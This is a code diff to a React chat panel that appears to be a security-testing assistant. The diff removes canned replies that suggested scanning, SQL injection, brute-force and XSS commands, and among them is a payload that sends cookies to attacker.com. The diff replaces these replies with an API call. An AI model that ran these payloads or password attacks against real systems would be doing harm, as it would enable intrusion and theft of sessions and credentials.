@@ -1,9 +1,9 @@
 import React, { useState, useRef } from 'react';
 import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
 import { Textarea } from '@/components/ui/textarea';
-import { Copy, Send, Bot, Trash, Download, ChevronUp, ChevronDown } from 'lucide-react';
+import { Copy, Send, Bot, Trash, Download } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
+import { generateResponse } from '@/lib/api';
 
 interface Message {
   role: 'user' | 'ai';
@@ -25,34 +25,11 @@ const AIAutomationPanel: React.FC = () => {
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const { toast } = useToast();
 
-  const securityCommandSuggestions = {
-    'scan': [
-      'nmap -sV -p- {target}',
-      'nikto -h {target}',
-      'gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt'
-    ],
-    'web': [
-      'sqlmap -u "{target}" --dbs',
-      'xss-scanner {target}',
-      'wpscan --url {target} --api-token YOUR_TOKEN'
-    ],
-    'network': [
-      'tcpdump -i eth0 host {target}',
-      'wireshark -i eth0 -k -Y "host {target}"',
-      'traceroute {target}'
-    ],
-    'password': [
-      'hashcat -m 0 hash.txt wordlist.txt',
-      'john --wordlist=passwords.txt hashes.txt',
-      'hydra -l admin -P password-list.txt {target} http-post-form'
-    ]
-  };
-
   const scrollToBottom = () => {
     messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!prompt.trim()) return;
     
@@ -66,85 +43,26 @@ const AIAutomationPanel: React.FC = () => {
     setPrompt('');
     setIsThinking(true);
     
-    setTimeout(scrollToBottom, 100);
-    
-    setTimeout(() => {
-      let aiResponse: Message;
+    try {
+      const response = await generateResponse(prompt);
+      const aiMessage: Message = {
+        role: 'ai',
+        content: response.response,
+        timestamp: new Date(),
+        commands: response.commands
+      };
       
-      if (prompt.toLowerCase().includes('scan')) {
-        aiResponse = generateScanResponse(prompt);
-      } else if (prompt.toLowerCase().includes('xss') || prompt.toLowerCase().includes('cross-site')) {
-        aiResponse = generateXSSResponse(prompt);
-      } else if (prompt.toLowerCase().includes('sql') || prompt.toLowerCase().includes('injection')) {
-        aiResponse = generateSQLResponse(prompt);
-      } else if (prompt.toLowerCase().includes('password') || prompt.toLowerCase().includes('brute')) {
-        aiResponse = generatePasswordResponse(prompt);
-      } else {
-        aiResponse = generateGenericResponse(prompt);
-      }
-      
-      setMessages(prev => [...prev, aiResponse]);
+      setMessages(prev => [...prev, aiMessage]);
+    } catch (error) {
+      console.error('Error:', error);
+      toast({
+        title: "Error",
+        description: "Failed to generate response. Please try again.",
+      });
+    } finally {
       setIsThinking(false);
-      
       setTimeout(scrollToBottom, 100);
-    }, 1500);
-  };
-
-  const generateScanResponse = (prompt: string): Message => {
-    const targetMatch = prompt.match(/(?:scan|scanning|analyze)\s+(?:the\s+)?(?:website|site|host|server|domain|ip)?\s*(?:of|at|on)?\s*(?:https?:\/\/)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|(?:\d{1,3}\.){3}\d{1,3})/i);
-    const target = targetMatch ? targetMatch[1] : 'example.com';
-    
-    return {
-      role: 'ai',
-      content: `Based on your request, here are some recommended scanning commands for ${target}:`,
-      timestamp: new Date(),
-      commands: securityCommandSuggestions.scan.map(cmd => cmd.replace('{target}', target))
-    };
-  };
-  
-  const generateXSSResponse = (prompt: string): Message => {
-    return {
-      role: 'ai',
-      content: 'For Cross-Site Scripting (XSS) testing, here are some useful payloads and testing approaches:',
-      timestamp: new Date(),
-      commands: [
-        '<script>alert("XSS")</script>',
-        '<img src="x" onerror="alert(\'XSS\')">',
-        '<svg onload="alert(document.domain)">',
-        '"><script>fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)</script>'
-      ]
-    };
-  };
-  
-  const generateSQLResponse = (prompt: string): Message => {
-    return {
-      role: 'ai',
-      content: 'For SQL injection testing, here are some useful payloads and commands:',
-      timestamp: new Date(),
-      commands: [
-        "' OR 1=1--",
-        "' UNION SELECT 1,2,3,4,5--",
-        "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--",
-        "sqlmap -u \"https://example.com/page.php?id=1\" --dbs"
-      ]
-    };
-  };
-  
-  const generatePasswordResponse = (prompt: string): Message => {
-    return {
-      role: 'ai',
-      content: 'For password testing and brute force simulations, these commands are useful:',
-      timestamp: new Date(),
-      commands: securityCommandSuggestions.password
-    };
-  };
-  
-  const generateGenericResponse = (prompt: string): Message => {
-    return {
-      role: 'ai',
-      content: `I understand you're interested in "${prompt.substring(0, 30)}...". Could you specify what kind of security testing you'd like to perform? For example, you might want to scan for vulnerabilities, test for XSS, SQL injection, or perform password analysis.`,
-      timestamp: new Date()
-    };
+    }
   };
 
   const copyToClipboard = (text: string) => {
@@ -166,7 +84,12 @@ const AIAutomationPanel: React.FC = () => {
   };
 
   const downloadConversation = () => {
-    const text = messages.map(m => `${m.role.toUpperCase()} (${m.timestamp.toLocaleString()}):\n${m.content}\n${m.commands ? '\nCommands:\n' + m.commands.join('\n') + '\n' : ''}\n`).join('\n');
+    const text = messages.map(m => 
+      `${m.role.toUpperCase()} (${m.timestamp.toLocaleString()}):\n${m.content}\n${
+        m.commands ? '\nCommands:\n' + m.commands.join('\n') + '\n' : ''
+      }\n`
+    ).join('\n');
+    
     const blob = new Blob([text], { type: 'text/plain' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
@@ -291,43 +214,7 @@ const AIAutomationPanel: React.FC = () => {
             <Send size={18} />
           </Button>
         </form>
-        <div className="mt-2 text-xs text-gray-400 flex justify-between items-center">
-          <span>Shift+Enter for new line</span>
-          <span className="text-blue-400 cursor-pointer hover:underline">Suggested prompts</span>
-        </div>
       </div>
-      
-      <style>
-        {`
-        .typing-indicator {
-          display: flex;
-          align-items: center;
-        }
-        .typing-indicator span {
-          height: 8px;
-          width: 8px;
-          background: #3b82f6;
-          border-radius: 50%;
-          display: inline-block;
-          margin: 0 2px;
-          opacity: 0.6;
-          animation: typing 1.4s infinite ease-in-out;
-        }
-        .typing-indicator span:nth-child(1) {
-          animation-delay: 0s;
-        }
-        .typing-indicator span:nth-child(2) {
-          animation-delay: 0.2s;
-        }
-        .typing-indicator span:nth-child(3) {
-          animation-delay: 0.4s;
-        }
-        @keyframes typing {
-          0%, 100% { transform: translateY(0); }
-          50% { transform: translateY(-5px); }
-        }
-        `}
-      </style>
     </div>
   );
 };
